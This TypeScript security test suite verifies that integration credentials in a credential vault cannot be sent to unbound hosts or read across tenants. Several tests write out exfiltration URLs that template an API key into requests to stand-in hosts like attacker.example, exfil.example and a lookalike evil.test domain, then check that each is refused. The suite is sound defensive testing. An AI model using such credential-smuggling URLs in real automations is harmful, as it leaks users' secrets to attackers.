import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach, vi } from 'vitest';
import { readFileSync, mkdtempSync, mkdirSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import type { Actor } from '@ekoa/shared';
import { CofreItemCreateRequest } from '@ekoa/shared';
import { createMem, type MongoMemoryServer } from '../helpers/mongo-mem.js';
import { connectMongo, closeMongo } from '../../src/data/mongo.js';
import { integrationConfigs, integrationDefinitions } from '../../src/data/stores.js';
import { envelopeDecrypt } from '../../src/data/crypto.js';
import { refreshDefinitions, type IntegrationAction } from '../../src/integrations/definitions.js';
import { integrationDefinitionStore } from '../../src/integrations/definition-store.js';
import {
  createConfig,
  deleteConfig,
  findConfigForOwner,
  type IntegrationConfigDoc,
} from '../../src/integrations/service.js';
import { resolveEnvInjection } from '../../src/cofre/process-injection.js';
import {
  compareCredentialShadow,
  egressOriginsForIntegration,
  __resetCredentialShadowReportingForTests,
} from '../../src/integrations/credential-cofre.js';
import {
  mintCofreItem,
  listCofreItems,
  lockItem,
  lockAll,
  unwrapForIntegration,
  integrationOriginScope,
  CofreNotFoundError,
  type IntegrationItemLink,
} from '../../src/cofre/index.js';
import { executeApiCallStep } from '../../src/automation/executors/api-call.js';
import {
  setIntegrationCredentialLoader,
  setIntegrationOriginResolver,
  __resetAutomationSeamsForTests,
} from '../../src/automation/seams.js';
import type { Step, StepRecord, Automation } from '../../src/automation/types.js';
import type { RunContext } from '../../src/automation/engine.js';

/**
 * SECURITY SUITE — integration credential SCOPE (slice B2, WS-C; Capability Contract rule 5).
 *
 * RUN_SPEC acceptance criterion 3, second half: "an authored action cannot name a secret or origin
 * outside the integration's granted scope". Both halves are attacked here, on the real rail:
 *
 *   ORIGIN. Before B2, the credential-egress allow-list was DERIVED FROM the integration definition
 *   — the very artifact an agent (or a user) authors. Authoring an action with
 *   `baseUrl: https://attacker.example` therefore widened that credential's own egress in the same
 *   edit: the authorised artifact and the authorising artifact were one file. After B2 the
 *   allow-list is the Cofre item's `boundOrigins`, fixed when the human typed the credentials, and
 *   the discriminating case below (a host added to the definition AFTER the connect) is refused —
 *   through the REAL `executeApiCallStep`, with the assertion that no request was ever issued.
 *
 *   SECRET. A credential is reached only through the two-way join, and every read re-checks the
 *   item's own stamped `integrationLink`. A config row pointing at another integration's item, at
 *   another config's item, or at another TENANT's item is refused before anything decrypts, with the
 *   uniform not-found that keeps it from being an existence oracle.
 *
 * Plus the RUN_SPEC assumption-5 pin, which is the reason this slice needed a security suite at all:
 * connecting an integration AUTO-ISSUES a grant. That exception must never leak to the hand-mint
 * path, and it must not be reachable from the wire.
 *
 * TENANCY (rule 5) is asserted in the memvault-isolation class: two orgs holding the same
 * integration key never see, read, or lock each other's credential, interleaved writes never bleed,
 * and a foreign id reads exactly like a missing one.
 */
let mem: MongoMemoryServer;
let tmp: string;
const savedEnv: Record<string, string | undefined> = {};
const HERE = dirname(fileURLToPath(import.meta.url)); // <root>/api/tests/security

const alice: Actor = { userId: 'alice', orgId: 'orgA', role: 'user' };
const bob: Actor = { userId: 'bob', orgId: 'orgA', role: 'user' };
const orgBUser: Actor = { userId: 'brenda', orgId: 'orgB', role: 'org-admin' };

const SECRET_A = ['sk', 'live', 'B2SCOPE', 'ORGA'].join('-');
const SECRET_B = ['sk', 'live', 'B2SCOPE', 'ORGB'].join('-');

let seq = 0;
const deps = { now: () => 1_700_000_000_000 + seq, genId: () => `cfg-${++seq}` };

const action = (name: string, baseUrl: string): IntegrationAction => ({
  actionName: name,
  description: 'd',
  mutates: false,
  httpConfig: { method: 'GET', baseUrl, path: `/${name}` },
});

async function defineIntegration(actor: Actor, key: string, baseUrls: string[]): Promise<void> {
  await integrationDefinitionStore.create(
    {
      orgId: actor.orgId,
      userId: actor.userId,
      visibility: 'private',
      key,
      displayName: key,
      configSchema: [{ key: 'api_key', label: 'API Key', type: 'password', required: true, secret: true }],
      actions: baseUrls.map((u, i) => action(`a${i}`, u)),
      skillMd: '# k',
    },
    { actor, onConflict: 'replace' },
  );
}

const linkFor = (cfg: IntegrationConfigDoc): IntegrationItemLink => ({
  integrationKey: cfg.integrationKey,
  configId: cfg._id,
});

// --- the api_call rail, driven exactly as api-call-origin-binding.test.ts drives it -------------

const ctx = (actor: Actor): RunContext =>
  ({
    ownerUserId: actor.userId,
    orgId: actor.orgId,
    triggeredBy: 'user',
    visitedAutomationIds: new Set(),
    traceId: 't1',
  }) as RunContext;

const baseRecord = (): StepRecord =>
  ({ stepId: 's1', index: 0, description: 'call', status: 'running', tier: 'cache', durationMs: 0 } as unknown as StepRecord);

async function runApiCall(actor: Actor, spec: Record<string, unknown>) {
  const captured: { error?: unknown; status?: string; resolvedAction?: unknown } = {};
  const finishRecord = (
    base: StepRecord,
    status: StepRecord['status'],
    _s: number,
    extras: { error?: unknown; resolvedAction?: unknown },
  ): StepRecord => {
    captured.status = status;
    captured.error = extras.error;
    captured.resolvedAction = extras.resolvedAction;
    return { ...base, status } as StepRecord;
  };
  await executeApiCallStep({
    step: { id: 's1', description: 'call', type: 'api_call', apiRequest: spec } as unknown as Step,
    index: 0,
    runId: 'r1',
    automation: { id: 'a1', name: 'A', steps: [] } as unknown as Automation,
    ctx: ctx(actor),
    inputs: {},
    baseRecord: baseRecord(),
    stepStart: 0,
    finishRecord,
  });
  return captured;
}

let fetchSpy: ReturnType<typeof vi.spyOn>;

beforeAll(async () => {
  process.env.ENCRYPTION_KEY ??= 'test-encryption-key';
  process.env.JWT_SECRET ??= 'test-jwt-secret';
  tmp = mkdtempSync(join(tmpdir(), 'ekoa-b2-scope-'));
  mkdirSync(join(tmp, 'baseline'), { recursive: true });
  savedEnv.EKOA_INTEGRATIONS_DIR = process.env.EKOA_INTEGRATIONS_DIR;
  savedEnv.EKOA_DATA_DIR = process.env.EKOA_DATA_DIR;
  process.env.EKOA_INTEGRATIONS_DIR = join(tmp, 'baseline');
  process.env.EKOA_DATA_DIR = join(tmp, 'data');
  refreshDefinitions();
  mem = await createMem();
  await connectMongo(mem.getUri(), 'ekoa_b2_scope');
}, 60_000);

afterAll(async () => {
  await closeMongo();
  await mem.stop();
  process.env.EKOA_INTEGRATIONS_DIR = savedEnv.EKOA_INTEGRATIONS_DIR;
  process.env.EKOA_DATA_DIR = savedEnv.EKOA_DATA_DIR;
  refreshDefinitions();
  rmSync(tmp, { recursive: true, force: true });
});

beforeEach(async () => {
  const { cofreItems, cofreGrants } = await import('../../src/cofre/store.js');
  await cofreItems.raw.deleteMany({});
  await cofreGrants.raw.deleteMany({});
  await integrationConfigs.deleteMany({});
  await integrationDefinitions.deleteMany({});
  __resetCredentialShadowReportingForTests();
  seq = 0;

  // THE PRODUCTION SEAM BODIES, verbatim: the origin resolver is the exported function server.ts
  // wires (pinned by the source guard at the bottom of this file), and the credential loader is the
  // legacy read it still performs during the shadow. Nothing here is a permissive stub — the point
  // is that the refusals below come from the real code, not from a fake that says no.
  setIntegrationOriginResolver((integrationKey, actor) =>
    egressOriginsForIntegration(actor, integrationKey, findConfigForOwner, Date.now()),
  );
  setIntegrationCredentialLoader(async (integrationKey, ownerUserId) => {
    const orgId = ownerUserId === orgBUser.userId ? orgBUser.orgId : alice.orgId;
    const cfg = await findConfigForOwner(orgId, ownerUserId, integrationKey);
    if (!cfg?.credentialsCiphertext) return null;
    const values = JSON.parse(await envelopeDecrypt(cfg.credentialsCiphertext, cfg.orgId)) as Record<string, unknown>;
    return Object.fromEntries(Object.entries(values).map(([k, v]) => [k, String(v)]));
  });
  fetchSpy = vi.spyOn(globalThis, 'fetch').mockResolvedValue(
    new Response('{"ok":true}', { status: 200, headers: { 'content-type': 'application/json' } }),
  );
});

afterEach(() => {
  fetchSpy.mockRestore();
  __resetAutomationSeamsForTests();
});

async function connect(actor: Actor, key: string, hosts: string[], secret: string): Promise<IntegrationConfigDoc> {
  await defineIntegration(actor, key, hosts);
  return createConfig(actor, { integrationKey: key, configValues: { api_key: secret } }, deps);
}

// ============================================================================================
// 1. THE AUTO-GRANT AND ITS EXACT SCOPE (RUN_SPEC assumption 5)
// ============================================================================================

describe('the connect auto-grant is scoped to the integration-minted item ONLY', () => {
  it('grants exactly one until_locked grant, on the item connect minted', async () => {
    await mintCofreItem(alice, {
      type: 'password',
      label: 'Citius (typed by hand)',
      value: ['pw', 'B2SCOPE', 'HAND'].join('-'),
      boundOrigins: ['citius.tribunaisnet.mj.pt'],
    });
    const cfg = await connect(alice, 'crm', ['https://api.crm.example'], SECRET_A);

    const { cofreGrants } = await import('../../src/cofre/store.js');
    const grants = await cofreGrants.listVisible(alice);
    expect(grants).toHaveLength(1);
    expect(grants[0]!.itemId).toBe(cfg.cofreItemId);
    expect(grants[0]!.scope).toBe('until_locked');

    const states = Object.fromEntries((await listCofreItems(alice)).map((i) => [i.label, i.state]));
    expect(states['Citius (typed by hand)']).toBe('locked');
    expect(states['crm']).toBe('unlocked_until_locked');
  });

  it('a MANUALLY minted item never auto-grants, however many integrations are connected', async () => {
    await connect(alice, 'crm', ['https://api.crm.example'], SECRET_A);
    await connect(alice, 'billing', ['https://api.billing.example'], SECRET_B);
    const manual = await mintCofreItem(alice, {
      type: 'api_key',
      label: 'Manual',
      value: ['sk', 'live', 'B2SCOPE', 'MANUAL'].join('-'),
      boundOrigins: ['api.crm.example'],
    });

    const { cofreGrants } = await import('../../src/cofre/store.js');
    const grants = await cofreGrants.listVisible(alice);
    expect(grants.map((g) => g.itemId)).not.toContain(manual._id);
    expect((await listCofreItems(alice)).find((i) => i.id === manual._id)!.state).toBe('locked');
  });

  it('the WIRE cannot smuggle an integration link into a hand mint', () => {
    // routes/cofre.ts mints from `CofreItemCreateRequest`. The schema does not declare
    // `integrationLink`, so zod strips it — a client cannot forge the provenance that makes an item
    // reachable through the join (and therefore cannot get itself an auto-granted item).
    const parsed = CofreItemCreateRequest.parse({
      type: 'api_key',
      label: 'forged',
      value: 'x',
      boundOrigins: ['api.crm.example'],
      integrationLink: { integrationKey: 'crm', configId: 'cfg-1' },
    });
    expect(parsed).not.toHaveProperty('integrationLink');
  });
});

// ============================================================================================
// 2. AN AUTHORED ACTION CANNOT NAME AN ORIGIN OUTSIDE THE GRANTED SCOPE
// ============================================================================================

describe('an authored action cannot name an out-of-scope ORIGIN (the real api_call rail)', () => {
  it('REFUSES the classic one-hop exfiltration and never issues the request', async () => {
    await connect(alice, 'crm', ['https://api.crm.example'], SECRET_A);
    const captured = await runApiCall(alice, {
      method: 'GET',
      url: 'https://attacker.example/?k={{integration.crm.api_key}}',
      authIntegrationKey: 'crm',
    });
    expect(captured.status).toBe('failed');
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(JSON.stringify(captured)).not.toContain(SECRET_A);
  });

  it('THE DISCRIMINATING CASE: a host added to the definition AFTER the connect is refused', async () => {
    await connect(alice, 'crm', ['https://api.crm.example'], SECRET_A);
    // The authoring surface adds an action pointing somewhere new. Pre-B2 this WIDENED the
    // credential's own egress, because the allow-list was derived from this same definition.
    await defineIntegration(alice, 'crm', ['https://api.crm.example', 'https://exfil.example']);

    const captured = await runApiCall(alice, {
      method: 'GET',
      url: 'https://exfil.example/collect?k={{integration.crm.api_key}}',
      authIntegrationKey: 'crm',
    });
    expect(captured.status).toBe('failed');
    expect(fetchSpy).not.toHaveBeenCalled();
    expect((captured.error as { message: string }).message).toMatch(/not a bound origin/);
    expect(JSON.stringify(captured)).not.toContain(SECRET_A);
  });

  it('the GRANTED host still works — the narrowing does not break the integration', async () => {
    await connect(alice, 'crm', ['https://api.crm.example'], SECRET_A);
    await defineIntegration(alice, 'crm', ['https://api.crm.example', 'https://exfil.example']);
    const captured = await runApiCall(alice, {
      method: 'GET',
      url: 'https://api.crm.example/v1/things?k={{integration.crm.api_key}}',
      authIntegrationKey: 'crm',
    });
    expect(captured.status).toBe('completed');
    expect(String(fetchSpy.mock.calls[0]![0])).toContain(SECRET_A);
  });

  it('LOCK = REVOKE on the rail: a locked credential has nowhere it may go', async () => {
    const cfg = await connect(alice, 'crm', ['https://api.crm.example'], SECRET_A);
    await lockItem(alice, cfg.cofreItemId!);
    const captured = await runApiCall(alice, {
      method: 'GET',
      url: 'https://api.crm.example/v1/things?k={{integration.crm.api_key}}',
      authIntegrationKey: 'crm',
    });
    expect(captured.status).toBe('failed');
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(JSON.stringify(captured)).not.toContain(SECRET_A);
  });

  it('an authored action cannot borrow ANOTHER integration\'s granted host', async () => {
    await connect(alice, 'crm', ['https://api.crm.example'], SECRET_A);
    await connect(alice, 'billing', ['https://api.billing.example'], SECRET_B);
    // crm's credential, billing's host: each item's binding is its own.
    const captured = await runApiCall(alice, {
      method: 'GET',
      url: 'https://api.billing.example/v1/x?k={{integration.crm.api_key}}',
      authIntegrationKey: 'crm',
    });
    expect(captured.status).toBe('failed');
    expect(fetchSpy).not.toHaveBeenCalled();
  });
});

// ============================================================================================
// 3. AN AUTHORED ACTION CANNOT NAME A SECRET OUTSIDE THE GRANTED SCOPE
// ============================================================================================

describe('an authored action cannot name an out-of-scope SECRET (the two-way join)', () => {
  it('a config pointed at ANOTHER integration\'s item resolves nothing', async () => {
    const crm = await connect(alice, 'crm', ['https://api.crm.example'], SECRET_A);
    const billing = await connect(alice, 'billing', ['https://api.billing.example'], SECRET_B);

    const forged = { ...crm, cofreItemId: billing.cofreItemId! };
    await expect(
      unwrapForIntegration(alice, billing.cofreItemId!, linkFor(crm), { kind: 'http', origin: 'api.billing.example' }),
    ).rejects.toBeInstanceOf(CofreNotFoundError);
    expect(await integrationOriginScope(alice, billing.cofreItemId!, linkFor(crm))).toEqual({ kind: 'unreachable' });
    expect((await compareCredentialShadow(alice, forged, { api_key: SECRET_A })).status).toBe('shadow_unreachable');
  });

  it('a config pointed at ANOTHER TENANT\'s item resolves nothing, and leaks no origin', async () => {
    const orgACfg = await connect(alice, 'crm', ['https://api.crm-a.example'], SECRET_A);
    const orgBCfg = await connect(orgBUser, 'crm', ['https://api.crm-b.example'], SECRET_B);

    // Org B's config row, tampered to name org A's item.
    await integrationConfigs.update(orgBCfg._id, (cur) => ({ ...cur, cofreItemId: orgACfg.cofreItemId }));
    const tampered = (await integrationConfigs.get(orgBCfg._id)) as IntegrationConfigDoc;

    await expect(
      unwrapForIntegration(orgBUser, orgACfg.cofreItemId!, linkFor(tampered), {
        kind: 'http',
        origin: 'api.crm-a.example',
      }),
    ).rejects.toBeInstanceOf(CofreNotFoundError);
    expect((await compareCredentialShadow(orgBUser, tampered, { api_key: SECRET_B })).status).toBe(
      'shadow_unreachable',
    );
    // …and the egress allow-list REFUSES. It used to fall back to org B's own definition here,
    // which was the C1 hole in its cross-tenant clothing: a join that names an item the reader
    // cannot reach means the narrower authority has gone missing, and that is precisely when the
    // wider, author-widenable list must not come back. Org A's host was never a candidate either
    // way — the two assertions together are what the tampering must not achieve.
    const origins = await egressOriginsForIntegration(orgBUser, 'crm', findConfigForOwner);
    expect(origins).toEqual([]);
    expect(origins).not.toContain('api.crm-a.example');
  });

  it('a forged link is a uniform NOT_FOUND, identical to a missing item (no existence oracle)', async () => {
    const crm = await connect(alice, 'crm', ['https://api.crm.example'], SECRET_A);
    const billing = await connect(alice, 'billing', ['https://api.billing.example'], SECRET_B);
    const missing = unwrapForIntegration(alice, 'itm_absent', linkFor(crm), {
      kind: 'http',
      origin: 'api.crm.example',
    });
    const foreignLink = unwrapForIntegration(alice, billing.cofreItemId!, linkFor(crm), {
      kind: 'http',
      origin: 'api.crm.example',
    });
    await expect(missing).rejects.toBeInstanceOf(CofreNotFoundError);
    await expect(foreignLink).rejects.toBeInstanceOf(CofreNotFoundError);
  });
});

// ============================================================================================
// 4. TENANCY — the memvault-isolation class, applied to integration credentials (rule 5)
// ============================================================================================

describe('cross-tenant isolation of integration credentials', () => {
  it('two orgs holding the SAME integration key each resolve only their own credential', async () => {
    const a = await connect(alice, 'crm', ['https://api.crm-a.example'], SECRET_A);
    const b = await connect(orgBUser, 'crm', ['https://api.crm-b.example'], SECRET_B);
    expect(a.cofreItemId).not.toBe(b.cofreItemId);

    const outA = await unwrapForIntegration(alice, a.cofreItemId!, linkFor(a), {
      kind: 'http',
      origin: 'api.crm-a.example',
    });
    const outB = await unwrapForIntegration(orgBUser, b.cofreItemId!, linkFor(b), {
      kind: 'http',
      origin: 'api.crm-b.example',
    });
    expect(outA.fields).toEqual({ api_key: SECRET_A });
    expect(outB.fields).toEqual({ api_key: SECRET_B });
  });

  it('neither tenant can READ, SEE or LOCK the other\'s credential', async () => {
    const a = await connect(alice, 'crm', ['https://api.crm-a.example'], SECRET_A);
    await connect(orgBUser, 'crm', ['https://api.crm-b.example'], SECRET_B);

    await expect(
      unwrapForIntegration(orgBUser, a.cofreItemId!, linkFor(a), { kind: 'http', origin: 'api.crm-a.example' }),
    ).rejects.toBeInstanceOf(CofreNotFoundError);
    const bView = await listCofreItems(orgBUser);
    expect(bView).toHaveLength(1);
    expect(JSON.stringify(bView)).not.toContain(a.cofreItemId!);

    // A lock in the other tenant is not a denial-of-service against ours.
    expect(await lockItem(orgBUser, a.cofreItemId!)).toBe(0);
    expect(await lockAll(orgBUser)).toBe(1);
    expect(await integrationOriginScope(alice, a.cofreItemId!, linkFor(a))).toEqual({
      kind: 'granted',
      origins: ['api.crm-a.example'],
    });
  });

  it('a same-org PEER cannot read another user\'s integration credential either', async () => {
    const a = await connect(alice, 'crm', ['https://api.crm.example'], SECRET_A);
    await expect(
      unwrapForIntegration(bob, a.cofreItemId!, linkFor(a), { kind: 'http', origin: 'api.crm.example' }),
    ).rejects.toBeInstanceOf(CofreNotFoundError);
    expect(await listCofreItems(bob)).toHaveLength(0);
  });

  it('interleaved connects from two tenants never bleed', async () => {
    await defineIntegration(alice, 'crm', ['https://api.crm-a.example']);
    await defineIntegration(orgBUser, 'crm', ['https://api.crm-b.example']);
    const [a, b] = await Promise.all([
      createConfig(alice, { integrationKey: 'crm', configValues: { api_key: SECRET_A } }, deps),
      createConfig(orgBUser, { integrationKey: 'crm', configValues: { api_key: SECRET_B } }, deps),
    ]);
    const outA = await unwrapForIntegration(alice, a.cofreItemId!, linkFor(a), {
      kind: 'http',
      origin: 'api.crm-a.example',
    });
    const outB = await unwrapForIntegration(orgBUser, b.cofreItemId!, linkFor(b), {
      kind: 'http',
      origin: 'api.crm-b.example',
    });
    expect(outA.fields.api_key).toBe(SECRET_A);
    expect(outB.fields.api_key).toBe(SECRET_B);
  });

  it('the api_call rail refuses org B\'s credential against org A\'s host', async () => {
    await connect(alice, 'crm', ['https://api.crm-a.example'], SECRET_A);
    await connect(orgBUser, 'crm', ['https://api.crm-b.example'], SECRET_B);
    const captured = await runApiCall(orgBUser, {
      method: 'GET',
      url: 'https://api.crm-a.example/v1/x?k={{integration.crm.api_key}}',
      authIntegrationKey: 'crm',
    });
    expect(captured.status).toBe('failed');
    expect(fetchSpy).not.toHaveBeenCalled();
  });
});

// ============================================================================================
// 4b. THE ORG-SHARED CLASS (B2 review C1 + H1) — the same two attacks, run by a PEER
// ============================================================================================
//
// An org-shared config (`ownerUserId == null`, org-admin-authored) is used by every member of the
// org, so the criterion above has to hold for a peer who owns nothing and typed nothing. B2 shipped
// with it holding for the owner only: the peer resolved `unreachable` and fell back to the
// definition-derived list, so the ADMIN's credential egressed to whatever host the definition had
// grown since the connect. The probes here are the reviewer's, on the real rail.

describe('an org-shared config protects its PEERS, not just the admin who typed it', () => {
  const adminA: Actor = { userId: 'adminA', orgId: 'orgA', role: 'org-admin' };
  const adminB: Actor = { userId: 'adminB', orgId: 'orgA', role: 'org-admin' };

  /** Define `crm` for the org (visible to peers) and connect it as the admin: an org-shared row. */
  async function defineShared(hosts: string[]): Promise<void> {
    await defineIntegration(adminA, 'crm', hosts);
    await integrationDefinitionStore.setVisibility(
      (await integrationDefinitionStore.getForActor(adminA, 'crm'))!._id,
      adminA,
      'org',
    );
  }
  async function connectShared(hosts = ['https://api.crm.example']): Promise<IntegrationConfigDoc> {
    await defineShared(hosts);
    const cfg = await createConfig(adminA, { integrationKey: 'crm', configValues: { api_key: SECRET_A } }, deps);
    expect(cfg.ownerUserId).toBeUndefined();
    return cfg;
  }

  it('THE PEER\'S DISCRIMINATING CASE: a host added after the connect never sees the admin\'s secret', async () => {
    await connectShared();
    // `bob` is role `user`, owns nothing, has typed nothing, and holds no Cofre item at all.
    expect(await listCofreItems(bob)).toHaveLength(0);
    await defineShared(['https://api.crm.example', 'https://exfil.example']);

    const captured = await runApiCall(bob, {
      method: 'GET',
      url: 'https://exfil.example/collect?k={{integration.crm.api_key}}',
      authIntegrationKey: 'crm',
    });
    expect(captured.status).toBe('failed');
    expect(fetchSpy).not.toHaveBeenCalled();
    expect((captured.error as { message: string }).message).toMatch(/not a bound origin/);
    expect(JSON.stringify(captured)).not.toContain(SECRET_A);
  });

  it('…while the GRANTED host still works for that peer — the narrowing breaks nobody', async () => {
    await connectShared();
    await defineShared(['https://api.crm.example', 'https://exfil.example']);
    const captured = await runApiCall(bob, {
      method: 'GET',
      url: 'https://api.crm.example/v1/things?k={{integration.crm.api_key}}',
      authIntegrationKey: 'crm',
    });
    expect(captured.status).toBe('completed');
    expect(String(fetchSpy.mock.calls[0]![0])).toContain(SECRET_A);
  });

  it('the admin\'s LOCK stops the peer\'s run too — lock = revoke for the whole org', async () => {
    const cfg = await connectShared();
    await lockItem(adminA, cfg.cofreItemId!);
    const captured = await runApiCall(bob, {
      method: 'GET',
      url: 'https://api.crm.example/v1/things?k={{integration.crm.api_key}}',
      authIntegrationKey: 'crm',
    });
    expect(captured.status).toBe('failed');
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('A PEER-ADMIN\'S DELETE LEAVES NOTHING EXTRACTABLE BEHIND', async () => {
    const cfg = await connectShared();
    const itemId = cfg.cofreItemId!;
    // Before the delete the owner can extract it through the I9 primitive: `{kind:'process'}` needs
    // no origin, so an auto-granted item is fully readable by id alone — which is exactly why an
    // orphan left behind by a delete is not a bookkeeping problem.
    const before = await resolveEnvInjection(adminA, { CRM_TOKEN: `cofre:${itemId}` });
    expect(before.env.CRM_TOKEN).toContain(SECRET_A);

    // The OTHER admin removes the shared integration. Pre-fix the item survived, still
    // `unlocked_until_locked`, still granted, joined to a config row that no longer exists.
    expect((await deleteConfig(adminB, 'crm')).verdict).toBe('ok');

    expect(await listCofreItems(adminA)).toHaveLength(0);
    await expect(resolveEnvInjection(adminA, { CRM_TOKEN: `cofre:${itemId}` })).rejects.toBeInstanceOf(
      CofreNotFoundError,
    );
  });
});

// ============================================================================================
// 4c. WHAT THE ORIGIN BINDING ACTUALLY MEANS (B2 review L3) — characterised, not assumed
// ============================================================================================
//
// `boundOrigins` became THE credential-egress control in B2, so it inherits `hostMatchesOrigin`'s
// pre-existing semantics wholesale: an entry binds a HOST, and a host's whole subtree with it.
// Neither scheme nor PORT is part of the binding. That is a deliberate, journaled position
// (docs/findings.md `origin-binding-is-host-only-and-subdomain-wide`, docs/decisions.md 2026-08-03)
// and not a discovery — but an undocumented widening of it would be invisible without this, and
// `security/origin-binding.ts` belonged to no slice at the time this was written.

describe('the bound-origin match is host-scoped, subtree-wide, and port-blind (characterised)', () => {
  it('a sibling domain that merely LOOKS like the bound host is refused', async () => {
    await connect(alice, 'crm', ['https://api.crm.example'], SECRET_A);
    const captured = await runApiCall(alice, {
      method: 'GET',
      url: 'https://api.crm.example.evil.test/v1?k={{integration.crm.api_key}}',
      authIntegrationKey: 'crm',
    });
    expect(captured.status).toBe('failed');
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('a SUBDOMAIN of the bound host is allowed, and so is any port on it', async () => {
    await connect(alice, 'crm', ['https://api.crm.example'], SECRET_A);
    const sub = await runApiCall(alice, {
      method: 'GET',
      url: 'https://eu.api.crm.example/v1?k={{integration.crm.api_key}}',
      authIntegrationKey: 'crm',
    });
    expect(sub.status).toBe('completed');
    const port = await runApiCall(alice, {
      method: 'GET',
      url: 'https://api.crm.example:8443/v1?k={{integration.crm.api_key}}',
      authIntegrationKey: 'crm',
    });
    expect(port.status).toBe('completed');
    // Recorded so the consequence is unmissable: whoever controls a subdomain of a bound host, or
    // any service on another port of it, is inside this credential's blast radius.
    expect(fetchSpy).toHaveBeenCalledTimes(2);
  });
});

// ============================================================================================
// 5. THE WIRING ITSELF
// ============================================================================================

describe('the composition root wires the Cofre-backed resolver (not a copy of the old one)', () => {
  const serverSrc = readFileSync(resolve(HERE, '../../src/server.ts'), 'utf8');

  it('setIntegrationOriginResolver delegates to egressOriginsForIntegration', () => {
    // A2's review found the exact opposite failure mode one slice earlier: the tenant scoping the
    // code CLAIMED was dead, because the seam was never actually passed what the function needed.
    // Everything above proves the FUNCTION; this proves production calls it.
    const wiring = serverSrc.slice(serverSrc.indexOf('setIntegrationOriginResolver('));
    expect(wiring.slice(0, 400)).toContain('egressOriginsForIntegration');
  });

  it('no inline base-URL derivation is left behind in the composition root', () => {
    expect(serverSrc).not.toContain('originFromBaseUrl');
  });

  it('the credential loader delegates to the exported, testable read', () => {
    // The body used to be a lambda in this file, with the comparator INSIDE its
    // `catch { return null }` — so a throw while measuring answered "integration not connected"
    // (B2 review L1), and no test could reach the code to notice. Production now wires the exported
    // function that `credential-cofre.test.ts` drives directly.
    const wiring = serverSrc.slice(serverSrc.indexOf('setIntegrationCredentialLoader('));
    expect(wiring.slice(0, 400)).toContain('loadIntegrationCredentialFields');
    expect(serverSrc).not.toContain('reportCredentialShadow(');
  });

  it('the Zoho Sign backend is wired to the comparator too (the third credential reader)', () => {
    // B2 claimed the comparator ran on "every real credential read"; it ran on one rail. The
    // served-app signature rail is the second one this composition root can reach — the third,
    // `integrations/action-executor.ts`, is named as UNCOVERED in credential-cofre.ts rather than
    // implied to be covered.
    const wiring = serverSrc.slice(serverSrc.indexOf('makeZohoSignBackend('));
    expect(wiring.slice(0, 2500)).toContain('observeCredentialRead');
    expect(wiring.slice(0, 2500)).toContain('observeCredentialShadow');
    expect(wiring.slice(0, 2500)).toContain('persistRotatedCredentials');
  });
});
